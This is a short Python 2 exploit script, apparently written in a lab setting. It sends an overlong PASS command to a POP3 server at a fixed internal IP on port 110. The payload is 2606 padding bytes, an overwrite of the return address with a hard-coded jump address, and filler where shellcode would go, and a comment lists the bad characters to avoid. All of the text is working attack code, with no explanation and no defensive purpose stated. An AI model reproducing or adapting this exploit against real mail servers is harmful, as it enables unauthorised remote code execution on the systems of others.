#!/usr/bin/env python
import socket, sys

if __name__ == '__main__':

	# bad chars: \x00, \x0a, \x0d

	#5f4a358f

	buff = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * (3500-2606-4)
	
	
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock_conn = sock.connect(('10.11.21.97', 110))
		data = sock.recv(1024)
		print data

		sock.send('USER test\r\n')
		data = sock.recv(1024)
		print data

		sock.send('PASS {0}\r\n'.format(buff))
		data = sock.recv(1024)
		print data
	except socket.error:
		print("[x] Unable to connect...")
	finally:
		sock.close()
		sys.exit(0)
		

